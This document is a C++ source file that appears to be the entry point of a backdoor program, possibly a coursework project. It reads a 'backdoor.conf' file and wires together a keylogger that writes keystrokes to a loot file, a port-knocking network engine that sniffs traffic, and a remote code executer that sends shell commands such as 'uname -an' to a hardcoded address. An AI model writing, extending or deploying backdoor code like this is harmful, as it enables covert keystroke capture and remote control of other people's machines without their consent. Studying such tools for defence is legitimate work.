#include "main.h"

#include <vector>

#include <unistd.h>

#include "Crypto.h"
#include "NetworkEngine.h"
#include "RemoteCodeExecuter.h"
#include "TcpStack.h"
#include "UdpStack.h"
#include "authenticator.h"

#include "Keylogger.h"

const short sport = 42069;
const short dport = 7575;

const std::string testCmd("uname -an");
unsigned int testAddr = 0xc0a80166;

UCharVector data({'a', 'b', 'c', 'd', 'e'});

// TODO: Remove
void testKeylogger(const Properties &p) {
    Keylogger kl(p.at("keylogLootFile"));
    kl.start_logging(); // should be started in another thread
}

// TODO: Remove
void testKnock(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
    netEngine.startSniff("ip and udp");
    netEngine.knockAndSend(*netEngine.getIp(), data);
    netEngine.stopSniff();
}

// TODO: Remove
void testRce(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    struct in_addr daddr;
    daddr.s_addr = testAddr;

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
    netEngine.startSniff("ip and tcp");

    sleep(1);
    RemoteCodeExecuter::sendCommand(&netEngine, daddr, testCmd);

    sleep(30);
    netEngine.stopSniff();
}

// TODO: Remove
void testRceRes(const Properties &p) {
    const std::string &interface = p.at("interface");
    const std::string &key = p.at("key");

    const std::string &knockPattern = p.at("knockPattern");
    unsigned short knockPort = std::stoi(p.at("knockPort"));
    unsigned int knockDuration = std::stoi(p.at("knockDuration"));

    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);

    RemoteCodeExecuter::executeCommand(&netEngine, testAddr, testCmd.c_str());
}

int main(int argc, char *argv[]) {
    Properties p = getConfig("backdoor.conf");

    // testKeylogger(p);
    // testKnock(p);
    testRce(p);
    // testRceRes(p);

    return 0;
}

/*
 * Opens and parses the configuration file for and stores the key value pairs in a hash map.
 *
 * Params:
 *      const std::string &filename: The relative path of the configuration file.
 *
 * Returns:
 *      The hash map containing all the successfully parsed key value pairs of the configuration
 *      file.
 */
Properties getConfig(const std::string &filename) {
    std::ifstream file(filename);
    std::string line;
    Properties properties;

    if (file.is_open()) {
        while (std::getline(file, line)) {
            std::istringstream is_line(line);
            std::string key;

            if (std::getline(is_line, key, '=')) {
                std::string value;

                if (key[0] == '#') {
                    continue;
                }

                if (std::getline(is_line, value)) {
                    properties[key] = value;
                }
            }
        }
    }

    return properties;
}
